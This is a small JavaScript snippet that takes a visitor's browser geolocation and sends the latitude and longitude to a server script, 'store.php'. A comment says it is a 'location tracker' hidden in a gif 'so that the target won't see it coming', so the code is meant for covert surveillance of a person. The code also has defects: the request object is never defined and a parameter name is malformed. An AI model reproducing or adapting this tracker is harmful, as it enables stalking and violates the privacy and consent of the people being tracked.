var x = document.getElementById('demo');


function getLocation(){
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(showPosition);
    }
    else{
        x.innerHTML = "Geolocation is not supported by this browser";
    }
    console.log("Funtion1")
}


function showPosition(position){
    //sends a "get" request to a specific page
    xhttp.open("GET", "store.php?lat=" +   
    position.coords.latitude + "&Long =" + 
    position.coords.longitude);
    xhttp.send();
  
    // // the code below is not needed because it simply shows the cordinates to the user.
    // x.innerHTML = "Latitude: " + position.coords.latitude + 
    // "<br>Longitude: " + position.coords.longitude;
    // this is my location tracker code embedded in a gif so that the target won't see it coming
}


